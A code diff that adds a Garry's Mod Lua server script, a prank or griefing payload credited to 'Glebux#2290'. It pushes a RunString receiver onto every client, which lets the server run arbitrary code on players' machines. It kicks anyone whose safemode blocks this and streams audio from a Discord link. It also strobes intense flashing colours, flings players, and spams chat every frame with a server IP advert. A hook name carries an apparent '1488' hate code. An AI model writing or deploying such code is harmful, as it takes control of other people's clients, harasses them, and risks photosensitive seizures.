@@ -1,0 +1,376 @@
+--Made by Glebux#2290
+local isstas = false
+local act2 = false
+local act0 = false
+local function stas()
+    --if isstas then return end
+    isstas = true
+    util.AddNetworkString("DJSTAS")
+    timer.Remove("STASVEL")
+    net.Receive("DJSTAS", function(_, ply)
+        local act = net.ReadInt(4)
+        if act == -1 then
+            ply:CrosshairDisable()
+        end
+        if act == -2 then
+            ply:CrosshairEnable()
+        end
+        if act == 0 then
+            if not act0 then
+                act0 = true
+                RunConsoleCommand("sv_friction", "-1000")
+            end
+        end
+        if act == 2 then
+            if act2 then return end
+            act2 = true 
+            timer.Create("STASVEL", 0.5, 0, function()
+                for _, v in pairs(player.GetAll()) do
+                    v:SetVelocity(Vector(math.random(-1000, 1000), math.random(-1000, 1000), 500))
+                end
+            end)
+        end
+        if act == 1 then
+            net.Start("DJSTAS")
+            net.WriteString([==[
+                coroutine.wrap(function() sound.PlayURL("https://cdn.discordapp.com/attachments/739878174858412036/1108090297012994108/dj_stas_2007_.mp3", "stereo", function(station)
+                    local disptext = ""
+                    local psychomode = false
+                    local visdata = {}
+                    local vismost = 0
+                    hook.Add("Think", "vis", function()
+                        visdata = {}
+                        station:FFT(visdata, FFT_1024)
+                        local ctbl = table.Copy(visdata)
+                        table.sort(ctbl, function(a,b) return a > b end)
+                        if ctbl[1] then
+                            vismost = ctbl[1] * 250
+                        else
+                            vismost = 0
+                        end
+                    end)
+                    surface.CreateFont("STAS1", {
+                        font = "Arial",
+                        extended = true,
+                        size = 50
+                    })
+                    surface.CreateFont("STAS2", {
+                        font = "Arial",
+                        extended = true,
+                        size = 50,
+                        underline = true,
+                    })
+                    surface.CreateFont("STAS3", {
+                        font = "Arial",
+                        extended = true,
+                        size = 50,
+                        italic = true
+                    })
+                    surface.CreateFont("STAS4", {
+                        font = "Arial",
+                        extended = true,
+                        size = 50,
+                        weight = 800,
+                    })
+                    local font = "STAS4"
+                    hook.Add("HUDPaint", "STAS1488", function()
+                        surface.SetFont(font)
+                        if not psychomode then
+                            local tx, ty = surface.GetTextSize(disptext)
+                            surface.SetTextPos(ScrW()/2-tx/2, ScrH()/2-ty/2)
+                            surface.SetTextColor(HSVToColor(  ( CurTime() * 1000 ) % 360, 1, 1 ))
+                            surface.DrawText(disptext)
+                        else
+                            for i = 1, 100 do
+                                local tx, ty = surface.GetTextSize(disptext)
+                                surface.SetTextPos(math.random(0, ScrW()-tx), math.random(0, ScrW()-ty))
+                                surface.SetTextColor(HSVToColor(  ( (CurTime()+1) * 1000 ) % 360, 1, 1 ))
+                                surface.DrawText(disptext)
+                            end
+                        end
+                    end)
+                    timer.Simple(0.4, function()
+                        disptext = "Внимание"
+                    end)
+                    timer.Simple(2, function()
+                        disptext = "Аудио тест на IQ"
+                    end)
+                    timer.Simple(4, function()
+                        disptext = "Вы слушаете..."
+                    end)
+                    timer.Simple(5.5, function()
+                        disptext = "D-D-D-D-D-D-D-D-D-D-D"
+                        timer.Create("STASTEXT", 0.01, 0, function()
+                            font = "STAS"..math.random(1,4)
+                        end)
+                    end)
+                    timer.Simple(6.7, function()
+                        disptext = "DJ стас 2007"
+                        timer.Remove("STASTEXT")
+                        font = "STAS1"
+                    end)
+                    timer.Simple(8, function()
+                        font = "STAS3"
+                    end)
+                    local lsd_trip = false
+                    hook.Add("CalcView", "sv_ass", function(ply, origin, angle, fov, znear, zfar)
+                        if lsd_trip then return {["origin"] = origin, ["angles"] = Angle(90,angle.y+vismost,vismost), ["fov"] = fov, ["znear"] = znear, ["zfar"] = zfar} end
+                    end)
+                    timer.Simple(10.5, function()
+                        font = "STAS1"
+                        disptext = ""
+                        chat.AddText(Color(255,255,255), "sv_stas by ", Color(255, 153, 0), "Glebux#2290")
+                        hook.Add("Think", "asas", function()
+                            chat.AddText(Color(255,255,255), "sv_stas by ", Color(255, 153, 0), "ЗАХОДИТЕ НА 46.174.54.77:27015")
+                        end)
+                        local ang = 0
+                        hook.Add("Think", "rotate", function()
+                            ang = ang+(vismost * (lsd_trip and 10 or 1))*FrameTime()
+                        end)
+                        hook.Add("PostDraw2DSkyBox", "sosison", function()
+                            render.OverrideDepthEnable( true, false )
+                            render.SetViewPort( 0, 0, ScrW(), ScrH() )
+                            cam.Start2D()
+                            if lsd_trip then
+                                surface.SetDrawColor(HSVToColor(  ( CurTime() * 1000 ) % 360, 1, 1 ))
+                            else
+                                surface.SetDrawColor(0,0,0)
+                            end
+                            surface.DrawRect(0,0,ScrW(),ScrH())
+                            local off = 0
+                            local sz = 10
+                            local toff = 0
+                            for i,v in ipairs(visdata) do
+                                surface.SetDrawColor(HSVToColor(  ( (CurTime()+toff) * (lsd_trip and 1000 or 100) ) % 360, 1, 1 ))
+                                toff = toff + 0.1
+                                surface.DrawRect(off, 0, sz, v*(lsd_trip and 2000 or 1000))
+                                off = off + sz + 1
+                            end
+                            local point = (EyePos()+util.GetSunInfo().direction*10):ToScreen()
+                            surface.SetDrawColor(255,255,255, 255)
+                            surface.SetMaterial(Material("data/morgen.png"))
+                            surface.DrawTexturedRectRotated(ScrW()/2, ScrH()/2, 66, 66, ang)
+                            cam.End2D()
+                            render.OverrideDepthEnable( false, false )
+                        end)
+                        hook.Add("PreRender","ebanaya_vertuha_1000-7",function()
+                            local mat = Matrix()
+                            local ang = Angle(0,CurTime()*40,0)
+                            local val = ((math.sin(math.rad((CurTime()*40)%360)))*10000)
+                            mat:Rotate(ang)
+                            mat:Translate(Vector(val,0,0))
+                            mat:Rotate(-ang)
+                            cam.PushModelMatrix( mat )
+                        end)
+                        RunConsoleCommand("r_3dsky", "0")
+                        net.Start("DJSTAS")
+                        net.WriteInt(-2, 4)
+                        net.SendToServer()
+                        net.Start("DJSTAS")
+                        net.WriteInt(0, 4)
+                        net.SendToServer()
+                    end)
+                    timer.Simple(30, function()
+                        net.Start("DJSTAS")
+                        net.WriteInt(-1, 4)
+                        net.SendToServer()
+                        disptext = "Всем привет, меня зовут Влад A4!"
+                    end)
+                    timer.Simple(32, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(33, function()
+                        disptext = "Копяков!"
+                    end)
+                    timer.Simple(34, function()
+                        disptext = "И DJ Стас 2007"
+                    end)
+                    timer.Simple(36.5, function()
+                        disptext = ""
+                    end)
+                    timer.Simple(41, function()
+                        disptext = "Погнали!"
+                    end)
+                    timer.Create("stas_start", 41.5, 1, function()
+                        lsd_trip = true
+                        psychomode = true
+                        font = "STAS4"
+                        net.Start("DJSTAS")
+                        net.WriteInt(2, 4)
+                        net.SendToServer()
+                        stas_mat = vgui.Create("DFrame")
+		                stas_mat:SetSize(ScrW(), ScrH())
+		                stas_mat:ShowCloseButton(false)
+		                stas_mat:SetDraggable(false)
+		                stas_mat.Paint = function(self, w, h)
+		                	surface.SetDrawColor(255, 255, 255, 0)
+		                	surface.DrawRect(0, 0, w, h)
+		                end
+		                stas_mat:SetTitle("")
+		                stas_matt = vgui.Create("Material", stas_mat)
+		                stas_matt:SetSize(ScrW(), ScrH())
+		                stas_matt.AutoSize = false
+		                stas_matt:SetMaterial("effects/tp_eyefx/tpeye")
+                        disptext = "Это ламба!"
+                    end)
+                    timer.Simple(42.5, function()
+                        disptext = "А это гелик!"
+                    end)
+                    timer.Simple(43.5, function()
+                        disptext = "Влад это бумага"
+                    end)
+                    timer.Simple(44.5, function()
+                        disptext = "А бумага это деньги!"
+                    end)
+                    timer.Simple(46, function()
+                        disptext = "Это ламба!"
+                    end)
+                    timer.Simple(47, function()
+                        disptext = "А это гелик!"
+                    end)
+                    timer.Simple(48, function()
+                        disptext = "Влад это бумага"
+                    end)
+                    timer.Simple(49, function()
+                        disptext = "А бумага это деньги!"
+                    end)
+                    timer.Simple(50, function()
+                        disptext = "Hello kids!"
+                    end)
+                    timer.Simple(51, function()
+                        font = "STAS3"
+                        disptext = "Hello kids!"
+                    end)
+                    timer.Simple(52, function()
+                        font = "STAS4"
+                        disptext = "Я мало топиец"
+                    end)
+                    timer.Simple(53, function()
+                        disptext = "Я сияю ярко"
+                    end)
+                    timer.Simple(54, function()
+                        disptext = "Будто толпы детских лиц!"
+                    end)
+                    timer.Simple(55, function()
+                        disptext = "Радости на лицах!"
+                    end)
+                    timer.Simple(56, function()
+                        disptext = "Будем веселиться!"
+                    end)
+                    timer.Simple(57, function()
+                        disptext = "А если кнопка красная, ей надо измениться"
+                    end)
+                    timer.Simple(60, function()
+                        disptext = "на серую"
+                    end)
+                    timer.Simple(60.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(61, function()
+                        disptext = "Копяков!"
+                    end)
+                    timer.Simple(61.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(62, function()
+                        disptext = "Влад бумага!"
+                    end)
+                    timer.Simple(62.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(63, function()
+                        disptext = "Копяков!"
+                    end)
+                    timer.Simple(63.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(64, function()
+                        disptext = "Влад бумага!"
+                    end)
+                    timer.Simple(64.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(65, function()
+                        disptext = "Копяков!"
+                    end)
+                    timer.Simple(65.5, function()
+                        disptext = "Гылен!"
+                    end)
+                    timer.Simple(66, function()
+                        disptext = "Влад бумага!"
+                    end)
+                    timer.Simple(67, function()
+                        disptext = "А вы совсем забыли как летает моя ламба!"
+                    end)
+                    timer.Simple(69, function()
+                        disptext = ""
+                    end)
+                end)
+            end)()
+                hook.Remove("PostDraw2DSkyBox", "sosison")
+            ]==])
+            net.Send(ply)
+            ply:CrosshairDisable()
+            ply.STASED = true
+        end
+    end)
+    timer.Simple(0.1, function()
+        for _, v in pairs(player.GetAll()) do
+            v:SendLua([[
+                net.Receive("DJSTAS", function()
+                    RunString(net.ReadString())
+                end)
+                net.Start("DJSTAS")
+                net.WriteInt(1, 4)
+                net.SendToServer()
+            ]])
+            timer.Simple(5, function()
+                if IsValid(v) then
+                    if not v.STASED then
+                        v:Kick("Сударь, вы в курсе что включать safemode это плохо?")
+                    end
+                end
+            end)
+        end
+    end)
+end
+local function unstas()
+    isstas = false
+    act2 = false
+    act0 = false
+    RunConsoleCommand("sv_friction", "8")
+    timer.Remove("STASVEL")
+    net.Start("DJSTAS")
+    net.WriteString([==[
+        hook.Remove("PostDraw2DSkyBox", "sosison")
+        hook.Remove("Think", "Think")
+        hook.Remove("HUDPaint", "STAS1488")
+        hook.Remove("CalcView", "sv_ass")
+        hook.Add("PreRender","ebanaya_vertuha_1000-7",function()
+            local mat = Matrix()
+        
+            local ang = Angle(0,0,0)
+            mat:Rotate(ang)
+        
+        
+            cam.PushModelMatrix( mat )
+        end)
+        timer.Remove("stas_start")
+        RunConsoleCommand("stopsound")
+        RunConsoleCommand("r_3dsky", "1")
+        if IsValid(stas_mat) then
+            stas_mat:Remove()
+            stas_mat = nil
+        end
+        if IsValid(stas_matt) then
+            stas_matt:Remove()
+            stas_matt = nil
+        end
+        net.Start("DJSTAS")
+        net.WriteInt(-2, 4)
+        net.SendToServer()
+    ]==])
+    net.Broadcast()
+end
+concommand.Add("stas", stas)
+concommand.Add("unstas", unstas)
